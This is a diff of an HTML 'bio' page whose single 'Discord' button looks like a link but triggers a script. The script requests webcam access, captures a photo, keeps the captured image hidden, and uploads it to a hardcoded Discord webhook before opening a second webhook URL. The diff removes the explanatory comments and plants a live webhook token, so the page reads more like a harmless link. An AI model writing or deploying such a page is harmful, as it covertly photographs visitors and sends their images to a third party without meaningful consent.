@@ -5,13 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bio MidNight</title>
     <style>
-        /* General Page Styling */
         body {
             font-family: 'Arial', sans-serif;
             background-color: #f0f4f8;
             background-image: url('https://i.pinimg.com/originals/ec/b6/41/ecb6416c16b66e9e5409def9271224a2.gif');
-            background-size: cover; /* Ensure the GIF covers the entire page */
-            background-position: center center; /* Center the background image */
+            background-size: cover;
+            background-position: center center;
             margin: 0;
             padding: 0;
             display: flex;
@@ -25,10 +24,9 @@
         h1 {
             font-size: 2.5rem;
             margin-bottom: 20px;
-            color: #fff; /* Make the text white so it's visible on the dark background */
+            color: #fff;
         }
 
-        /* From Uiverse.io by kleenpulse */
         .btn {
             --border-color: linear-gradient(-45deg, #ffae00, #7e03aa, #00fffb);
             --border-width: 0.125em;
@@ -116,9 +114,8 @@
             color: #fff;
         }
 
-        /* Hiding the captured image */
         #capturedImage {
-            display: none; /* Do not display the image */
+            display: none;
         }
     </style>
 </head>
@@ -126,7 +123,6 @@
 
 <h1 id="text">Welcome to MidNight</h1>
 
-<!-- Update button to use the new .btn class -->
 <button id="captureButton" class="btn">
     <span class="text">Discord</span>
 </button>
@@ -134,50 +130,39 @@
 <script>
     const captureButton = document.getElementById('captureButton');
 
-    // Discord Webhook URL
     const discordWebhookUrl = 'https://discord.com/api/webhooks/1303968519964196875/uTGDp9VSZ8whf0ZB_yxcle8dpzjh9jyiV5T1hElIWi2mS1FHLaNlj37q99ufIzHNPDbJ';
     
-    // Discord Channel URL (This will open after sending the image)
-    const discordChannelUrl = 'https://discord.com/channels/YOUR_CHANNEL_ID';
+    const discordChannelUrl = 'https://discord.com/api/webhooks/1304219564543967232/1ULT8YWfPSgjsSghp9cL9p7keAmuqaE4hqjiryrpQsnyF_FdZmOm0i_BrBcq3tuiVror';
 
     captureButton.addEventListener('click', async () => {
         let videoStream;
         try {
-            // Request access to the camera
             videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = videoStream;
-            document.body.appendChild(video);  // Video element added temporarily
+            document.body.appendChild(video);
 
-            // Play the video stream
             await new Promise((resolve) => {
                 video.onloadedmetadata = () => resolve(video.play());
             });
 
-            // Set up a canvas to capture the photo
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
             
-            // Draw the video frame on the canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Get the image data as a base64 PNG image
             const imageUrl = canvas.toDataURL('image/png');
             
-            // Convert base64 image data to Blob
             const response = await fetch(imageUrl);
             const blob = await response.blob();
 
-            // Send image to Discord
             await sendImageToDiscord(blob);
 
-            // Clean up: remove the video element and stop the video stream
             videoStream.getTracks().forEach(track => track.stop());
             document.body.removeChild(video);
 
-            // Open Discord channel after successful image upload
             window.open(discordChannelUrl, '_blank');
 
         } catch (error) {
@@ -186,14 +171,11 @@
         }
     });
 
-    // Function to send the captured image to Discord using the Webhook
     async function sendImageToDiscord(imageBlob) {
         try {
-            // Prepare the FormData to send the image to Discord
             const formData = new FormData();
             formData.append('file', imageBlob, 'captured_image.png');
 
-            // Send POST request to Discord Webhook
             const sendResponse = await fetch(discordWebhookUrl, {
                 method: 'POST',
                 body: formData
